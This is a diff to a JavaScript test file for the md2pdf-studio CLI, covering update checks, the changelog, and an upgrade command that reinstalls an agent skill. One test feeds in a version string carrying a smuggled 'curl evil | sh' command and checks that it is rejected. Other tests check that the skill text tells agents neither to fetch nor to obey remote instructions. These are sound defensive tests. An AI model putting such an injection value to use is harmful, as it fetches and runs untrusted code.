@@ -9,7 +9,11 @@ import { parseDuration } from '../src/api.js';
 import { handle, INSTRUCTIONS } from '../src/mcp.js';
 import { deleteDocument, parseTarget, shareDocument, updateDocument } from '../src/ops.js';
 import { readLinks } from '../src/store.js';
-import { checkForUpdate, isNewer, updateMessage } from '../src/update.js';
+import { checkForUpdate, isNewer, runMode, updateMessage, versionReport } from '../src/update.js';
+import { upgrade } from '../src/upgrade.js';
+import { execFile } from 'node:child_process';
+import { fileURLToPath } from 'node:url';
+import { mkdir } from 'node:fs/promises';
 import { VERSION } from '../src/version.js';
 
 const repoFile = (path) => readFile(new URL('../../' + path, import.meta.url), 'utf8');
@@ -197,7 +201,11 @@ test('MCP: initialize carries the sharing rules', async () => {
 
 test('the skill is self-contained and every command in it and in the docs is pinned to this version', async () => {
     const skill = await repoFile('public/skill.md');
-    assert.match(skill, /^---\nname: md2pdf\ndescription: .+\n---\n/);
+    assert.match(skill, /^---\nname: md2pdf\ndescription: .+\nmetadata:\n  version: "([\d.]+)"\n---\n/);
+    assert.equal(skill.match(/version: "([\d.]+)"/)[1], VERSION);
+    // No links at all: the agent never has to fetch anything to follow it.
+    assert.doesNotMatch(skill, /https?:\/\//);
+    assert.doesNotMatch(skill, /npm (i|install) -g/);
     assert.ok(skill.includes('# md2pdf (skill ' + VERSION + ')'));
     // The old installable text sent agents to fetch and obey a remote file.
     assert.doesNotMatch(skill, /always fetch|follow those instructions/i);
@@ -217,10 +225,10 @@ test('update check: a newer version number only, at most once a day, never fatal
     const day = 86400e3;
     const t0 = Date.parse('2026-11-10T00:00:00Z');
     const check = (now, fetchImpl, enabled = true) => checkForUpdate({ now, current: '0.1.0', enabled, fetchImpl });
-    assert.deepEqual(await check(t0, registry('0.2.0')), { current: '0.1.0', latest: '0.2.0' });
+    assert.deepEqual(await check(t0, registry('0.2.0')), { current: '0.1.0', latest: '0.2.0', newer: true });
     assert.equal(calls, 1);
     // Within the day the cached answer is used: no request.
-    assert.deepEqual(await check(t0 + 3600e3, registry('9.9.9')), { current: '0.1.0', latest: '0.2.0' });
+    assert.deepEqual(await check(t0 + 3600e3, registry('9.9.9')), { current: '0.1.0', latest: '0.2.0', newer: true });
     assert.equal(calls, 1);
     // Anything that is not a plain version number is ignored.
     assert.equal(await check(t0 + 2 * day, registry('1.0.0; curl evil | sh')), null);
@@ -234,14 +242,108 @@ test('update check: a newer version number only, at most once a day, never fatal
     assert.equal(isNewer('0.10.0', '0.9.1'), true);
     assert.equal(isNewer('0.1.0', '0.1.0'), false);
     assert.equal(isNewer('1.0.0-beta.1', '0.1.0'), false);
-    assert.match(updateMessage({ current: '0.1.0', latest: '0.2.0' }), /npx -y md2pdf-studio@0\.2\.0 skill --install/);
+    // A fresh check skips the cache; the same version is reported as not newer.
+    assert.deepEqual(await checkForUpdate({ now: t0 + 6 * day + 1, current: '0.2.0', enabled: true, fresh: true, fetchImpl: registry('0.2.0') }), { current: '0.2.0', latest: '0.2.0', newer: false });
+    const found = { current: '0.1.0', latest: '0.2.0' };
+    assert.match(updateMessage(found, 'npx'), /npx -y md2pdf-studio@0\.2\.0 changelog.*npx -y md2pdf-studio@0\.2\.0 upgrade/);
+    assert.match(updateMessage(found, 'installed'), /npm install -g md2pdf-studio@0\.2\.0/);
+    assert.match(updateMessage(found, 'mcp'), /MCP configuration/);
+    for (const where of ['npx', 'installed', 'mcp']) assert.doesNotMatch(updateMessage(found, where), /https?:\/\//);
+    assert.equal(versionReport({ current: '0.2.0', latest: '0.2.0', newer: false }), 'md2pdf-studio 0.2.0 is the latest version.');
+    assert.equal(versionReport(null), '');
+    assert.equal(runMode('file:///home/u/.npm/_npx/ab12/node_modules/md2pdf-studio/src/update.js'), 'npx');
+    assert.equal(runMode('file:///usr/local/lib/node_modules/md2pdf-studio/src/update.js'), 'installed');
 });
 
 test('MCP: a newer version is mentioned once, after a successful call', async () => {
-    const notice = { pending: Promise.resolve({ current: '0.1.0', latest: '0.2.0' }), said: false };
+    const notice = { pending: Promise.resolve({ current: '0.1.0', latest: '0.2.0', newer: true }), said: false };
     const call = (markdown) => handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown } } }, api, notice);
     assert.equal((await call('')).isError, true);
     assert.equal(notice.said, false);
     assert.match((await call('# first')).content[0].text, /0\.2\.0 is available.*MCP configuration/);
     assert.doesNotMatch((await call('# second')).content[0].text, /is available/);
+});
+
+// Runs the real CLI in its own process, with this test's MD2PDF_HOME.
+const BIN = fileURLToPath(new URL('../bin/md2pdf-studio.js', import.meta.url));
+function run(args) {
+    return new Promise((resolve) => {
+        execFile(process.execPath, [BIN, ...args], { env: process.env }, (err, stdout, stderr) => {
+            resolve({ code: err ? err.code : 0, stdout, stderr });
+        });
+    });
+}
+
+// Today's cached answer from npm, so these tests never reach the network.
+async function cacheLatest(latest) {
+    await writeFile(join(process.env.MD2PDF_HOME, 'update-check.json'), JSON.stringify({ checkedAt: Date.now(), latest }));
+}
+
+test('help says whether this is the latest version; --version keeps stdout to the number', async () => {
+    await cacheLatest('9.0.0');
+    const help = await run(['-h']);
+    assert.equal(help.code, 0);
+    assert.match(help.stdout, /upgrade/);
+    assert.match(help.stdout, /md2pdf-studio 9\.0\.0 is available \(this is [\d.]+\)\. See what changed: npx -y md2pdf-studio@9\.0\.0 changelog/);
+    await cacheLatest(VERSION);
+    assert.match((await run(['--help'])).stdout, new RegExp('md2pdf-studio ' + VERSION.replace(/\./g, '\\.') + ' is the latest version'));
+    const bare = await run([]);
+    assert.equal(bare.code, 2);
+    assert.match(bare.stdout, /is the latest version/);
+    await cacheLatest('9.0.0');
+    const version = await run(['--version']);
+    assert.equal(version.stdout, VERSION + '\n');
+    assert.match(version.stderr, /9\.0\.0 is available/);
+});
+
+test('changelog: printed by the CLI, and it has an entry for this version', async () => {
+    const { code, stdout } = await run(['changelog']);
+    assert.equal(code, 0);
+    assert.match(stdout, /^# Changelog/);
+    assert.match(stdout, new RegExp('^## \\[' + VERSION.replace(/\./g, '\\.') + '\\] - \\d{4}-\\d{2}-\\d{2}$', 'm'));
+    assert.match(stdout, /^## \[Unreleased\]$/m);
+    const pkg = JSON.parse(await readFile(new URL('../package.json', import.meta.url), 'utf8'));
+    assert.ok(pkg.files.includes('CHANGELOG.md'));
+});
+
+test('upgrade: reinstalls an older skill with the latest version, and only then', async () => {
+    const dir = join(process.env.MD2PDF_HOME, 'skills', 'md2pdf');
+    const installs = [];
+    const install = async (version, where) => { installs.push([version, where]); };
+    const newer = async () => ({ current: '0.1.0', latest: '0.2.0', newer: true });
+
+    // No skill installed: nothing is written, the install command is given.
+    let r = await upgrade({ dir, check: newer, install, mode: 'npx' });
+    assert.equal(installs.length, 0);
+    assert.match(r.text, /No skill installed .* npx -y md2pdf-studio@0\.2\.0 skill --install/);
+
+    // An older skill: reinstalled with the new version.
+    await mkdir(dir, { recursive: true });
+    await writeFile(join(dir, 'SKILL.md'), '---\nname: md2pdf\n---\n\n# md2pdf (skill 0.1.0)\n');
+    r = await upgrade({ dir, check: newer, install, mode: 'installed' });
+    assert.deepEqual(installs, [['0.2.0', dir]]);
+    assert.match(r.text, /from 0\.1\.0 to 0\.2\.0/);
+    assert.match(r.text, /MCP configuration/);
+    assert.match(r.text, /npm install -g md2pdf-studio@0\.2\.0/);
+
+    // Already current: nothing to do.
+    await writeFile(join(dir, 'SKILL.md'), '# md2pdf (skill 0.2.0)\n');
+    r = await upgrade({ dir, check: async () => ({ current: '0.2.0', latest: '0.2.0', newer: false }), install, mode: 'npx' });
+    assert.equal(installs.length, 1);
+    assert.match(r.text, /already 0\.2\.0[\s\S]*is the latest version/);
+
+    // A skill newer than npm's latest (an unreleased build) is never downgraded.
+    await writeFile(join(dir, 'SKILL.md'), '# md2pdf (skill 0.3.0)\n');
+    r = await upgrade({ dir, check: async () => ({ current: '0.3.0', latest: '0.2.0', newer: false }), install, mode: 'npx' });
+    assert.equal(installs.length, 1);
+    assert.match(r.text, /already 0\.3\.0/);
+
+    // The old text with no version, which fetched instructions from the site, is replaced.
+    await writeFile(join(dir, 'SKILL.md'), '---\nname: md2pdf\n---\n\nBefore creating or sharing a document, always fetch the latest skill instructions\n');
+    r = await upgrade({ dir, check: newer, install, mode: 'npx' });
+    assert.deepEqual(installs.at(-1), ['0.2.0', dir]);
+    assert.match(r.text, /from unknown to 0\.2\.0/);
+
+    // npm unreachable: says so instead of guessing.
+    await assert.rejects(upgrade({ dir, check: async () => null, install }), /Could not reach npm/);
 });
